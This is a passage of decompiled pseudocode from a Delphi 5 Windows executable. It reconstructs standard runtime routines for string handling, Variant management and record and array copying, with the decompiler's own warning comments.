}

//----- (004036B0) --------------------------------------------------------
// Delphi 5 Visual Component Library
void __usercall __linkproc__ LStrFromPWChar(BYTE **a1@<eax>, int a2@<edx>)
{
  int v2; // ecx
  int v3; // ecx
  int v4; // [esp-4h] [ebp-4h]

  v2 = 0;
  if ( a2 )
  {
    v4 = a2;
    while ( *(_WORD *)a2 )
    {
      if ( !*(_WORD *)(a2 + 2) )
        goto LABEL_10;
      if ( !*(_WORD *)(a2 + 4) )
        goto LABEL_9;
      if ( !*(_WORD *)(a2 + 6) )
      {
        a2 += 2;
LABEL_9:
        a2 += 2;
LABEL_10:
        a2 += 2;
        break;
      }
      a2 += 8;
    }
    v3 = a2;
    a2 = v4;
    v2 = (unsigned int)(v3 - v4) >> 1;
  }
  __linkproc__ LStrFromPWCharLen(v2, (LPCWSTR)a2, a1);
}

//----- (004036EC) --------------------------------------------------------
void __usercall sub_4036EC(BYTE **a1@<eax>, unsigned __int8 *a2@<edx>)
{
  __linkproc__ LStrFromPCharLen(a1, a2 + 1, *a2);
}

//----- (004036F8) --------------------------------------------------------
void __usercall sub_4036F8(BYTE **a1@<eax>, BYTE *a2@<edx>, int a3@<ecx>)
{
  BYTE *v3; // edi
  bool v4; // zf
  int v5; // [esp-8h] [ebp-Ch]

  v5 = a3;
  v3 = a2;
  v4 = 1;
  do
  {
    if ( !a3 )
      break;
    v4 = *v3++ == 0;
    --a3;
  }
  while ( !v4 );
  if ( v4 )
    a3 = ~a3;
  __linkproc__ LStrFromPCharLen(a1, a2, v5 + a3);
}

//----- (00403724) --------------------------------------------------------
int __usercall sub_403724@<eax>(int result@<eax>)
{
  if ( result )
    result = *(_DWORD *)(result - 4);
  return result;
}

//----- (0040372C) --------------------------------------------------------
void __usercall System::__linkproc__ LStrCat(BYTE **a1@<eax>, char *a2@<edx>)
{
  BYTE *v2; // ecx
  int v5; // edi
  int v6; // edx
  BYTE *v7; // eax
  int v8; // ecx

  if ( a2 )
  {
    v2 = *a1;
    if ( *a1 )
    {
      v5 = *((_DWORD *)v2 - 1);
      v6 = v5 + *((_DWORD *)a2 - 1);
      if ( a2 == (char *)v2 )
      {
        System::__linkproc__ LStrSetLength(a1, v6, (LStr *)v2);
        v7 = *a1;
        v8 = v5;
      }
      else
      {
        System::__linkproc__ LStrSetLength(a1, v6, (LStr *)v2);
        v7 = (BYTE *)a2;
        v8 = *((_DWORD *)a2 - 1);
      }
      Move(v7, &(*a1)[v5], v8);
    }
    else
    {
      __linkproc__ LStrAsg((char **)a1, a2);
    }
  }
}

//----- (00403770) --------------------------------------------------------
void __usercall System::__linkproc__ LStrCat3(BYTE **a1@<eax>, BYTE *a2@<edx>, char *a3@<ecx>)
{
  BYTE *v5; // edi
  char *v7; // [esp-8h] [ebp-8h]
  BYTE **v8; // [esp-4h] [ebp-4h]

  if ( a2 )
  {
    if ( a3 )
    {
      if ( a2 == *a1 )
      {
        System::__linkproc__ LStrCat(a1, a3);
      }
      else if ( a3 == (char *)*a1 )
      {
        v5 = (BYTE *)System::__linkproc__ NewAnsiString(*((_DWORD *)a3 - 1) + *((_DWORD *)a2 - 1));
        Move(a2, v5, *((_DWORD *)a2 - 1));
        Move((BYTE *)a3, &v5[*((_DWORD *)a2 - 1)], *((_DWORD *)a3 - 1));
        if ( v5 )
          --*((_DWORD *)v5 - 2);
        __linkproc__ LStrAsg((char **)a1, (char *)v5);
      }
      else
      {
        v8 = a1;
        v7 = a3;
        __linkproc__ LStrAsg((char **)a1, (char *)a2);
        System::__linkproc__ LStrCat(v8, v7);
      }
    }
    else
    {
      __linkproc__ LStrAsg((char **)a1, (char *)a2);
    }
  }
  else
  {
    __linkproc__ LStrAsg((char **)a1, a3);
  }
}

//----- (004037E4) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall System::__linkproc__ LStrCatN@<eax>(char **a1@<eax>, int a2@<edx>)
{
  int v2; // ebx
  int v3; // eax
  int v4; // ecx
  char *v5; // esi
  BYTE *v6; // eax
  BYTE *v7; // edx
  int v8; // ecx
  int result; // eax
  char *v10; // [esp-10h] [ebp-18h]
  int v12; // [esp+4h] [ebp-4h]

  v2 = a2;
  v3 = 0;
  do
  {
    v4 = *(&v12 + a2);
    if ( v4 )
      v3 += *(_DWORD *)(v4 - 4);
    --a2;
  }
  while ( a2 );
  v10 = (char *)System::__linkproc__ NewAnsiString(v3);
  v5 = v10;
  do
  {
    v6 = (BYTE *)*(&v12 + v2);
    v7 = (BYTE *)v5;
    if ( v6 )
    {
      v8 = *((_DWORD *)v6 - 1);
      v5 += v8;
      Move(v6, v7, v8);
    }
    --v2;
  }
  while ( v2 );
  if ( v10 )
    --*((_DWORD *)v10 - 2);
  __linkproc__ LStrAsg(a1, v10);
  return result;
}
// 40382B: positive sp value 4 has been found

//----- (00403834) --------------------------------------------------------
_DWORD __fastcall System::__linkproc__ LStrCmp(char *str1, char *str2)
{
  int result; // eax
  int *v3; // esi
  char *v4; // edi
  unsigned int v5; // eax
  unsigned int v6; // edx
  bool v7; // cc
  unsigned int v8; // edx
  unsigned int v9; // edx
  int v10; // ecx
  int v11; // ebx
  char v12; // [esp-4h] [ebp-10h]

  v3 = (int *)result;
  v4 = str2;
  if ( (char *)result != str2 )
  {
    if ( result )
    {
      if ( str2 )
      {
        v5 = *(_DWORD *)(result - 4);
        v6 = *((_DWORD *)str2 - 1);
        v7 = v5 <= v6;
        result = v5 - v6;
        if ( v7 )
          v6 += result;
        v12 = v6;
        v8 = v6 >> 2;
        if ( v8 )
        {
          while ( *v3 == *(_DWORD *)v4 )
          {
            v9 = v8 - 1;
            if ( !v9 )
            {
              ++v3;
              v4 += 4;
              goto LABEL_13;
            }
            if ( v3[1] != *((_DWORD *)v4 + 1) )
              return result;
            v3 += 2;
            v4 += 8;
            v8 = v9 - 1;
            if ( !v8 )
              goto LABEL_13;
          }
        }
        else
        {
LABEL_13:
          if ( (v12 & 3) == 0
            || (v10 = *v3, v11 = *(_DWORD *)v4, (unsigned __int8)*v3 == (unsigned __int8)*(_DWORD *)v4)
            && ((v12 & 3) == 1 || BYTE1(v10) == BYTE1(v11) && ((v12 & 3) == 2 || (v10 & 0xFF0000) == (v11 & 0xFF0000))) )
          {
            result *= 2;
          }
        }
      }
      else
      {
        result = *(_DWORD *)(result - 4);
      }
    }
    else
    {
      result = -*((_DWORD *)str2 - 1);
    }
  }
  return result;
}
// 403837: variable 'result' is possibly undefined

//----- (004038D8) --------------------------------------------------------
int __usercall sub_4038D8@<eax>(int result@<eax>)
{
  if ( result )
  {
    if ( !((*(_DWORD *)(result - 8) + 1 < 0) ^ __OFADD__(1, *(_DWORD *)(result - 8)) | (*(_DWORD *)(result - 8) == -1)) )
      _InterlockedIncrement((volatile signed __int32 *)(result - 8));
  }
  return result;
}

//----- (004038E8) --------------------------------------------------------
char *__usercall sub_4038E8@<eax>(char *result@<eax>)
{
  if ( !result )
    result = &byte_4038ED;
  return result;
}
// 4038ED: using guessed type char byte_4038ED;

//----- (004038F4) --------------------------------------------------------
char *__usercall UniqueString@<eax>(char **a1@<eax>)
{
  char *v1; // edx
  char *v3; // edx
  char *v4; // eax

  v1 = *a1;
  if ( *a1 && *((_DWORD *)v1 - 2) != 1 )
  {
    v3 = (char *)System::__linkproc__ NewAnsiString(*((_DWORD *)v1 - 1));
    v4 = *a1;
    *a1 = v3;
    if ( *((int *)v4 - 2) >= 1 )
      _InterlockedDecrement((volatile signed __int32 *)v4 - 2);
    Move((BYTE *)v4, (BYTE *)v3, *((_DWORD *)v4 - 1));
    v1 = *a1;
  }
  return v1;
}

//----- (0040392C) --------------------------------------------------------
void __usercall __linkproc__ LStrCopy(char *src@<eax>, int index@<edx>, int len@<ecx>, char **dst)
{
  int v4; // ebx
  bool v5; // cc
  int v6; // edx
  int v7; // ebx

  if ( !src )
    goto LABEL_10;
  v4 = *((_DWORD *)src - 1);
  if ( !v4 )
    goto LABEL_10;
  v5 = index < 1;
  v6 = index - 1;
  if ( v5 )
  {
    v6 = 0;
  }
  else if ( v6 >= v4 )
  {
LABEL_10:
    System::__linkproc__ LStrClr((LStr *)len);
    return;
  }
  v7 = v4 - v6;
  if ( len < 0 )
    goto LABEL_10;
  if ( len > v7 )
    len = v7;
  __linkproc__ LStrFromPCharLen((BYTE **)dst, (BYTE *)&src[v6], len);
}
// 40392C: inconsistent function type and number of purged bytes

//----- (0040396C) --------------------------------------------------------
void __usercall System::__linkproc__ LStrDelete(char **a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  char *v6; // edx
  int v7; // ecx
  bool v8; // cc
  int v9; // esi
  int v10; // ecx
  LStr *v11; // ecx

  UniqueString(a1);
  v6 = *a1;
  if ( *a1 )
  {
    v7 = *((_DWORD *)v6 - 1);
    v8 = a2 < 1;
    v9 = a2 - 1;
    if ( !v8 && v9 < v7 && a3 > 0 )
    {
      v10 = v7 - v9;
      if ( a3 > v10 )
        a3 = v10;
      Move((BYTE *)&v6[v9 + a3], (BYTE *)&v6[v9], v10 - a3);
      System::__linkproc__ LStrSetLength((BYTE **)a1, *((_DWORD *)*a1 - 1) - a3, v11);
    }
  }
}
// 4039AB: variable 'v11' is possibly undefined

//----- (004039B4) --------------------------------------------------------
// local variable allocation has failed, the output may be wrong!
int __usercall __linkproc__ LStrPos@<eax>(char a@<al>, char *b@<edx>)
{
  int v2; // esi
  char *v3; // edi
  signed int v4; // ecx
  signed int v5; // edx
  char v6; // al
  const void *v7; // esi
  bool v8; // zf
  bool v9; // cc
  int v10; // ecx
  int v11; // ebx
  int result; // eax
  char *v13; // [esp-18h] [ebp-18h]
  const void *v14; // [esp-14h] [ebp-14h]

  if ( a )
  {
    if ( b )
    {
      v2 = a;
      v3 = b;
      v4 = *((_DWORD *)b - 1);
      v5 = *(_DWORD *)(a - 4) - 1;
      if ( v5 >= 0 )
      {
        v6 = *(_BYTE *)a;
        v7 = (const void *)(v2 + 1);
        v8 = v4 == v5;
        v9 = v4 <= v5;
        v10 = v4 - v5;
        if ( !v9 )
        {
          while ( 1 )
          {
            do
            {
              if ( !v10 )
                break;
              v8 = *v3++ == v6;
              --v10;
            }
            while ( !v8 );
            if ( !v8 )
              break;
            v11 = v10;
            v14 = v7;
            v13 = v3;
            v8 = memcmp(v7, v3, v5) == 0;
            v3 = v13;
            v7 = v14;
            if ( v8 )
            {
              *(_DWORD *)&a = v13 - b;
              goto LABEL_13;
            }
            v10 = v11;
          }
        }
      }
      *(_DWORD *)&a = 0;
    }
    else
    {
      *(_DWORD *)&a = 0;
    }
  }
LABEL_13:
  LOBYTE(result) = a;
  return result;
}
// 4039B4: bad return variable

//----- (004039FC) --------------------------------------------------------
void __usercall System::__linkproc__ LStrSetLength(BYTE **a1@<eax>, int a2@<edx>, LStr *a3@<ecx>)
{
  BYTE *v5; // edi
  BYTE *v6; // eax
  char *v7; // eax
  BYTE *v8; // eax
  int v9; // ecx
  BYTE *v10; // [esp-4h] [ebp-10h] BYREF

  v5 = 0;
  if ( a2 )
  {
    v6 = *a1;
    if ( *a1 && *((_DWORD *)v6 - 2) == 1 )
    {
      v10 = v6 - 8;
      __linkproc__ ReallocMem((void **)&v10, a2 + 9);
      v7 = (char *)(v10 + 8);
      *a1 = v10 + 8;
      *((_DWORD *)v7 - 1) = a2;
      v7[a2] = 0;
      return;
    }
    v5 = (BYTE *)System::__linkproc__ NewAnsiString(a2);
    v8 = *a1;
    if ( *a1 )
    {
      v9 = *((_DWORD *)v8 - 1);
      if ( v9 >= a2 )
        v9 = a2;
      Move(v8, v5, v9);
    }
  }
  System::__linkproc__ LStrClr(a3);
  *a1 = v5;
}
// 403A53: variable 'a3' is possibly undefined

//----- (00403A60) --------------------------------------------------------
_DWORD *__usercall sub_403A60@<eax>(_DWORD *a1@<eax>, char *a2@<edx>)
{
  signed int v3; // edx
  signed int v4; // ecx
  _DWORD *v5; // eax
  signed int v7; // [esp-8h] [ebp-8h]

  v3 = 0;
  v4 = 0;
  if ( a2 )
  {
    v4 = *((_DWORD *)a2 - 1);
    v3 = -v4;
  }
  v7 = v4;
  v5 = WRITESPACES(a1, v3);
  return WRITEBYTES(v5, a2, v7);
}

//----- (00403A90) --------------------------------------------------------
OLECHAR **__usercall sub_403A90@<eax>(OLECHAR **result@<eax>)
{
  OLECHAR *v1; // edx
  OLECHAR **v2; // [esp-4h] [ebp-4h]

  v1 = *result;
  if ( *result )
  {
    *result = 0;
    v2 = result;
    SysFreeString(v1);
    result = v2;
  }
  return result;
}

//----- (00403AA8) --------------------------------------------------------
void __usercall System::__linkproc__ WStrArrayClr(OLECHAR **a1@<eax>, int a2@<edx>)
{
  OLECHAR *v4; // eax

  do
  {
    v4 = *a1;
    if ( *a1 )
    {
      *a1 = 0;
      SysFreeString(v4);
    }
    ++a1;
    --a2;
  }
  while ( a2 );
}

//----- (00403ACC) --------------------------------------------------------
OLECHAR **__usercall System::__linkproc__ WStrAsg@<eax>(OLECHAR *a1@<edx>, OLECHAR **a2@<eax>)
{
  unsigned int v3; // ecx
  OLECHAR **result; // eax

  if ( !a1 )
    return sub_403A90(a2);
  v3 = *((_DWORD *)a1 - 1) >> 1;
  if ( !v3 )
    return sub_403A90(a2);
  result = (OLECHAR **)SysReAllocStringLen(a2, a1, v3);
  if ( !result )
    System::_16468(1);
  return result;
}

//----- (00403AF0) --------------------------------------------------------
char __usercall sub_403AF0@<al>(int a1@<eax>, int a2@<edx>)
{
  int v2; // ecx
  int v4; // esi
  int v5; // edi
  char result; // al
  bool v7; // zf
  bool v8; // sf
  bool v9; // of

  v2 = *(unsigned __int8 *)(a2 + 1);
  v4 = a2 + v2 + 10;
  v5 = *(_DWORD *)(a2 + v2 + 6);
  do
  {
    result = sub_403BB0((_DWORD *)(a1 + *(_DWORD *)(v4 + 4)), **(char ***)v4);
    v4 += 8;
    v9 = __OFSUB__(v5, 1);
    v7 = v5 == 1;
    v8 = --v5 < 0;
  }
  while ( !(v8 ^ v9 | v7) );
  return result;
}

//----- (00403B1C) --------------------------------------------------------
char __usercall System::__linkproc__ InitializeArray@<al>(_DWORD *a1@<eax>, char *a2@<edx>, int a3@<ecx>)
{
  char result; // al
  int v7; // edx
  bool v8; // cc
  int v9; // ebp
  _DWORD *v10; // eax
  int v11; // ebp
  _DWORD *v12; // eax

  result = *a2;
  v7 = (unsigned __int8)a2[1];
  switch ( result )
  {
    case 10:
    case 11:
      do
      {
LABEL_9:
        *a1++ = 0;
        v8 = a3-- <= 1;
      }
      while ( !v8 );
      return result;
    case 12:
      do
      {
        *a1 = 0;
        a1[1] = 0;
        a1[2] = 0;
        a1[3] = 0;
        a1 += 4;
        v8 = a3-- <= 1;
      }
      while ( !v8 );
      break;
    case 13:
      v9 = v7;
      do
      {
        v10 = a1;
        a1 = (_DWORD *)((char *)a1 + *(_DWORD *)&a2[v9 + 2]);
        result = System::__linkproc__ InitializeArray(v10, **(char ***)&a2[v9 + 10], *(_DWORD *)&a2[v9 + 6]);
        v8 = a3-- <= 1;
      }
      while ( !v8 );
      break;
    case 14:
      v11 = v7;
      do
      {
        v12 = a1;
        a1 = (_DWORD *)((char *)a1 + *(_DWORD *)&a2[v11 + 2]);
        result = sub_403AF0((int)v12, (int)a2);
        v8 = a3-- <= 1;
      }
      while ( !v8 );
      break;
    case 15:
    case 17:
      goto LABEL_9;
    default:
      System::_16468(2);
  }
  return result;
}

//----- (00403BB0) --------------------------------------------------------
char __usercall sub_403BB0@<al>(_DWORD *a1@<eax>, char *a2@<edx>)
{
  return System::__linkproc__ InitializeArray(a1, a2, 1);
}

//----- (00403BBC) --------------------------------------------------------
// Borland Visual Component Library & Packages
int __usercall System::__linkproc__ FinalizeRecord@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v2; // ecx
  int v4; // esi
  int v5; // edi
  bool v6; // zf
  bool v7; // sf
  bool v8; // of

  v2 = *(unsigned __int8 *)(a2 + 1);
  v4 = a2 + v2 + 10;
  v5 = *(_DWORD *)(a2 + v2 + 6);
  do
  {
    sub_403CD0((OLECHAR **)(a1 + *(_DWORD *)(v4 + 4)), **(char ***)v4);
    v4 += 8;
    v8 = __OFSUB__(v5, 1);
    v6 = v5 == 1;
    v7 = --v5 < 0;
  }
  while ( !(v7 ^ v8 | v6) );
  return a1;
}

//----- (00403BE8) --------------------------------------------------------
OLECHAR **__usercall System::__linkproc__ FinalizeArray@<eax>(OLECHAR **result@<eax>, char *a2@<edx>, int a3@<ecx>)
{
  OLECHAR **v3; // ebx
  int v5; // edi
  char v6; // al
  int v7; // edx
  VARIANTARG *v8; // eax
  bool v9; // cc
  int v10; // ebp
  OLECHAR **v11; // eax
  int v12; // ebp
  int v13; // eax
  OLECHAR **v14; // eax
  int *v15; // eax
  OLECHAR **v16; // [esp-4h] [ebp-4h]

  if ( a3 )
  {
    v16 = result;
    v3 = result;
    v5 = a3;
    v6 = *a2;
    v7 = (unsigned __int8)a2[1];
    switch ( v6 )
    {
      case 10:
        if ( a3 > 1 )
          System::__linkproc__ LStrArrayClr((LStr *)a3, a3);
        else
          System::__linkproc__ LStrClr((LStr *)a3);
        break;
      case 11:
        if ( a3 > 1 )
          System::__linkproc__ WStrArrayClr(v3, a3);
        else
          sub_403A90(v3);
        break;
      case 12:
        do
        {
          v8 = (VARIANTARG *)v3;
          v3 += 4;
          sub_4043B8(v8, (VARIANTARG *)a3);
          v9 = v5-- <= 1;
        }
        while ( !v9 );
        break;
      case 13:
        v10 = v7;
        do
        {
          v11 = v3;
          v3 = (OLECHAR **)((char *)v3 + *(_DWORD *)&a2[v10 + 2]);
          System::__linkproc__ FinalizeArray(v11, **(char ***)&a2[v10 + 10], *(_DWORD *)&a2[v10 + 6]);
          v9 = v5-- <= 1;
        }
        while ( !v9 );
        break;
      case 14:
        v12 = v7;
        do
        {
          v13 = (int)v3;
          v3 = (OLECHAR **)((char *)v3 + *(_DWORD *)&a2[v12 + 2]);
          System::__linkproc__ FinalizeRecord(v13, (int)a2);
          v9 = v5-- <= 1;
        }
        while ( !v9 );
        break;
      case 15:
        do
        {
          v14 = v3++;
          sub_404BD8(v14);
          v9 = v5-- <= 1;
        }
        while ( !v9 );
        break;
      case 17:
        do
        {
          v15 = (int *)v3++;
          System::__linkproc__ DynArrayClear(v15, (int)a2);
          v9 = v5-- <= 1;
        }
        while ( !v9 );
        break;
      default:
        System::_16468(2);
    }
    result = v16;
  }
  return result;
}
// 403C6E: variable 'a3' is possibly undefined

//----- (00403CD0) --------------------------------------------------------
OLECHAR **__usercall sub_403CD0@<eax>(OLECHAR **a1@<eax>, char *a2@<edx>)
{
  return System::__linkproc__ FinalizeArray(a1, a2, 1);
}

//----- (00403CDC) --------------------------------------------------------
// Borland Visual Component Library & Packages
int __usercall System::__linkproc__ CopyRecord@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v5; // edi
  int v6; // ebp
  int result; // eax
  int v8; // ecx
  bool v9; // cc
  VARIANT *v10; // ecx
  int v11; // eax
  _BYTE *v12; // edx
  int v13; // eax
  int v14; // ecx
  int v15; // [esp-8h] [ebp-18h]
  int v16; // [esp-8h] [ebp-18h]
  int v17; // [esp-4h] [ebp-14h]

  v5 = a3 + *(unsigned __int8 *)(a3 + 1) + 10;
  v6 = *(_DWORD *)(a3 + *(unsigned __int8 *)(a3 + 1) + 6);
  result = 0;
  v17 = *(_DWORD *)(a3 + *(unsigned __int8 *)(a3 + 1) + 2);
  do
  {
    v8 = *(_DWORD *)(v5 + 4);
    v9 = v8 <= result;
    v10 = (VARIANT *)(v8 - result);
    if ( !v9 )
      Move((BYTE *)(a2 + result), (BYTE *)(a1 + result), (int)v10);
    v11 = *(_DWORD *)(v5 + 4);
    v12 = **(_BYTE ***)v5;
    LOBYTE(v10) = *v12;
    if ( *v12 == 10 )
    {
      __linkproc__ LStrAsg((char **)(a1 + v11), *(char **)(a2 + v11));
      v13 = 4;
    }
    else
    {
      switch ( (_BYTE)v10 )
      {
        case 0xB:
          System::__linkproc__ WStrAsg(*(OLECHAR **)(a2 + v11), (OLECHAR **)(a1 + v11));
          v13 = 4;
          break;
        case 0xC:
          System::__linkproc__ VarCopy(v10, (VARIANTARG *)(a2 + v11), (VARIANT *)(a1 + v11));
          v13 = 16;
          break;
        case 0xD:
          v14 = (unsigned __int8)v12[1];
          v15 = *(_DWORD *)&v12[v14 + 2];
          System::__linkproc__ CopyArray(
            (char **)(a1 + v11),
            (char **)(a2 + v11),
            **(VARIANT ***)&v12[v14 + 10],
            *(_DWORD *)&v12[v14 + 6]);
          v13 = v15;
          break;
        case 0xE:
          v16 = *(_DWORD *)&v12[(unsigned __int8)v12[1] + 2];
          System::__linkproc__ CopyRecord(a1 + v11, a2 + v11, (int)v12);
          v13 = v16;
          break;
        case 0xF:
          sub_404BF0((int *)(a1 + v11), *(_DWORD *)(a2 + v11));
          v13 = 4;
          break;
        case 0x11:
          __linkproc__ DynArrayAsg((int *)(a1 + v11), *(_DWORD *)(a2 + v11), **(_DWORD **)v5);
          v13 = 4;
          break;
        default:
          System::_16468(2);
      }
    }
    result = *(_DWORD *)(v5 + 4) + v13;
    v5 += 8;
    --v6;
  }
  while ( v6 );
  if ( v17 > result )
    result = Move((BYTE *)(a2 + result), (BYTE *)(a1 + result), v17 - result);
  return result;
}
// 403D6E: variable 'v10' is possibly undefined

//----- (00403DF8) --------------------------------------------------------
// Borland Visual Component Library & Packages
void __userpurge System::__linkproc__ CopyArray(char **a1@<eax>, char **a2@<edx>, VARIANT *a3@<ecx>, int a4)
{
  int v6; // edi
  _DWORD *v8; // edi
  int v9; // eax

  v6 = (int)a3;
  LOBYTE(a3) = a3->vt;
  switch ( (_BYTE)a3 )
  {
    case 0xA:
      do
      {
        __linkproc__ LStrAsg(a1++, *a2++);
        --a4;
      }
      while ( a4 );
      break;
    case 0xB:
      do
      {
        System::__linkproc__ WStrAsg((OLECHAR *)*a2++, (OLECHAR **)a1++);
        --a4;
      }
      while ( a4 );
      break;
    case 0xC:
      do
      {
        System::__linkproc__ VarCopy(a3, (VARIANTARG *)a2, (VARIANT *)a1);
        a1 += 4;
        a2 += 4;
        --a4;
      }
      while ( a4 );
      break;
    case 0xD:
      v8 = (_DWORD *)(v6 + *(unsigned __int8 *)(v6 + 1) + 2);
      do
      {
        System::__linkproc__ CopyArray(v8[1]);
        a1 = (char **)((char *)a1 + *v8);
        a2 = (char **)((char *)a2 + *v8);
        --a4;
      }
      while ( a4 );
      break;
    case 0xE:
      do
      {
        System::__linkproc__ CopyRecord((int)a1, (int)a2, v6);
        v9 = *(unsigned __int8 *)(v6 + 1);
        a1 = (char **)((char *)a1 + *(_DWORD *)(v6 + v9 + 2));
        a2 = (char **)((char *)a2 + *(_DWORD *)(v6 + v9 + 2));
        --a4;
      }
      while ( a4 );
      break;
    case 0xF:
      do
      {
        sub_404BF0((int *)a1++, (int)*a2++);
        --a4;
      }
      while ( a4 );
      break;
    case 0x11:
      do
      {
        __linkproc__ DynArrayAsg((int *)a1++, (int)*a2++, v6);
        --a4;
      }
      while ( a4 );
      break;
    default:
      System::_16468(2);
  }
}
// 403E6D: variable 'a3' is possibly undefined

//----- (00403EEC) --------------------------------------------------------
void __usercall System::WideCharLenToStrVar(LPCWSTR lpWideCharStr@<ecx>, int cchWideChar@<edx>, const WCHAR *a3@<eax>)
{
  int v6; // eax
  int v7; // ebp
  CHAR MultiByteStr[2064]; // [esp+0h] [ebp-810h] BYREF

  if ( cchWideChar )
  {
    if ( cchWideChar >= 1024 )
    {
      v7 = WideCharToMultiByte(0, 0, a3, cchWideChar, 0, 0, 0, 0);
      __linkproc__ LStrFromPCharLen((BYTE **)lpWideCharStr, 0, v7);
      WideCharToMultiByte(0, 0, a3, cchWideChar, *(LPSTR *)lpWideCharStr, v7, 0, 0);
    }
    else
    {
      v6 = WideCharToMultiByte(0, 0, a3, cchWideChar, MultiByteStr, 2048, 0, 0);
      __linkproc__ LStrFromPCharLen((BYTE **)lpWideCharStr, (BYTE *)MultiByteStr, v6);
    }
  }
  else
  {
    System::__linkproc__ LStrClr((LStr *)lpWideCharStr);
  }
}

//----- (00403F78) --------------------------------------------------------
int __usercall System::OleStrToStrVar@<eax>(System::AnsiString *a1@<edx>, OLECHAR *a2@<eax>)
{
  int v5; // eax
  int result; // eax

  v5 = SysStringLen(a2);
  System::WideCharLenToStrVar((LPCWSTR)a1, v5, a2);
  return result;
}

//----- (00403F9C) --------------------------------------------------------
WCHAR *__usercall System::StringToOleStr@<eax>(CHAR *a1@<eax>)
{
  int v3; // esi
  char *v4; // eax
  int v5; // eax
  WCHAR *v6; // edi
  int v7; // ebp
  WCHAR WideCharStr[1032]; // [esp+0h] [ebp-810h] BYREF

  v3 = sub_403724((int)a1);
  if ( sub_403724((int)a1) >= 1024 )
  {
    v7 = MultiByteToWideChar(0, 0, a1, v3, 0, 0);
    v6 = SysAllocStringLen(0, v7);
    MultiByteToWideChar(0, 0, a1, v3, v6, v7);
  }
  else
  {
    v4 = sub_4038E8(a1);
    v5 = MultiByteToWideChar(0, 0, v4, v3, WideCharStr, 1024);
    v6 = SysAllocStringLen(WideCharStr, v5);
  }
  return v6;
}

//----- (00404020) --------------------------------------------------------
void __noreturn sub_404020()
{
  System::_16468(15);
}

//----- (00404030) --------------------------------------------------------
// Borland Visual Component Library & Packages
void __usercall System::__linkproc__ VarClear(VARIANTARG *pvarg@<ecx>, VARIANTARG *a2@<eax>)
{
  unsigned int v2; // edx

  v2 = a2->vt;
  if ( (a2->vt & 0x4000) != 0 || v2 < 8 )
  {
    a2->vt = 0;
  }
  else if ( v2 == 256 )
  {
    a2->vt = 0;
    System::__linkproc__ LStrClr((LStr *)pvarg);
  }
  else if ( v2 == 257 )
  {
    dword_41E3E0(pvarg);
  }
  else
  {
    VariantClear(a2);
  }
}
// 41E3E0: using guessed type int (__thiscall *dword_41E3E0)(_DWORD);

//----- (00404074) --------------------------------------------------------
VARIANT *__usercall System::__linkproc__ VarCopy@<eax>(VARIANT *pvarDest@<ecx>, VARIANTARG *pvargSrc@<edx>, VARIANT *result@<eax>)
{
  LONG v3; // edx
  VARIANTARG *v4; // [esp-8h] [ebp-8h]
  VARIANT *v5; // [esp-4h] [ebp-4h]

  if ( result == pvargSrc )
    return (VARIANT *)nullsub_2();
  if ( result->vt >= 8u )
  {
    v5 = result;
    v4 = pvargSrc;
    if ( result->vt == 256 )
    {
      System::__linkproc__ LStrClr((LStr *)pvarDest);
    }
    else if ( result->vt == 257 )
    {
      dword_41E3E0(pvarDest);
    }
    else
    {
      VariantClear(result);
    }
    pvargSrc = v4;
    result = v5;
  }
  if ( pvargSrc->vt < 8u )
    return (VARIANT *)sub_4040B2(result, pvargSrc);
  if ( pvargSrc->vt != 256 )
  {
    if ( pvargSrc->vt == 257 )
    {
      sub_4040B2(result, pvargSrc);
      return (VARIANT *)dword_41E3E8();
    }
    result->vt = 0;
    if ( VariantCopyInd(result, pvargSrc) )
      System::_16468(16);
    return (VARIANT *)nullsub_2();
  }
  v3 = pvargSrc->lVal;
  if ( v3 && !((*(_DWORD *)(v3 - 8) + 1 < 0) ^ __OFADD__(1, *(_DWORD *)(v3 - 8)) | (*(_DWORD *)(v3 - 8) == -1)) )
    _InterlockedIncrement((volatile signed __int32 *)(v3 - 8));
  result->vt = 256;
  result->lVal = v3;
  return result;
}
// 41E3E8: invalid function type has been ignored
// 40410C: using guessed type int nullsub_2(void);
// 41E3E0: using guessed type int (__thiscall *dword_41E3E0)(_DWORD);
// 41E3E8: using guessed type int (*dword_41E3E8)(void);

//----- (004040B2) --------------------------------------------------------
_DWORD *__usercall sub_4040B2@<eax>(_DWORD *result@<eax>, _DWORD *a2@<edx>)
{
  *result = *a2;
  result[2] = a2[2];
  result[3] = a2[3];
  return result;
}

//----- (00404110) --------------------------------------------------------
VARIANTARG *__usercall System::_16723@<eax>(VARIANTARG *a1@<ecx>, const void *a2@<edx>, VARIANTARG *a3@<eax>)
{
  VARIANTARG *v5; // ecx
  VARIANTARG *result; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *v7; // [esp-Ch] [ebp-28h] BYREF
  void *v8; // [esp-8h] [ebp-24h]
  int *v9; // [esp-4h] [ebp-20h]
  VARIANTARG *v10; // [esp+0h] [ebp-1Ch]
  VARIANTARG pvarSrc; // [esp+Ch] [ebp-10h] BYREF
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  qmemcpy(&pvarSrc, a2, sizeof(pvarSrc));
  System::__linkproc__ VarAddRef(&pvarSrc, a1);
  v9 = &savedregs;
  v8 = &loc_40416C;
  v7 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v7);
  dword_41E3E4(v7);
  System::_16725(a1, &pvarSrc, a3);
  v5 = v10;
  __writefsdword(0, (unsigned int)v8);
  v10 = (VARIANTARG *)&loc_404173;
  result = &pvarSrc;
  sub_4043B8(&pvarSrc, v5);
  return result;
}
// 404163: returning address of temporary local variable '%pvarSrc'
// 41E3E4: using guessed type int (__stdcall *dword_41E3E4)(_DWORD);

//----- (0040417C) --------------------------------------------------------
int __usercall sub_40417C@<eax>(VARIANTARG *a1@<ecx>, _WORD *a2@<edx>, VARIANTARG *a3@<eax>)
{
  int v3; // ebx

  v3 = 0;
  if ( *a2 == 257 )
  {
    System::_16723(a1, a2, a3);
    LOBYTE(v3) = 1;
  }
  return v3;
}

//----- (00404194) --------------------------------------------------------
// Borland Visual Component Library & Packages
VARIANTARG *__usercall System::_16725@<eax>(VARIANTARG *pvarg@<ecx>, VARIANTARG *pvarSrc@<edx>, VARIANTARG *a3@<eax>)
{
  VARTYPE v3; // di
  __int16 v6; // ax
  VARIANTARG *v7; // ecx
  VARIANTARG *result; // eax
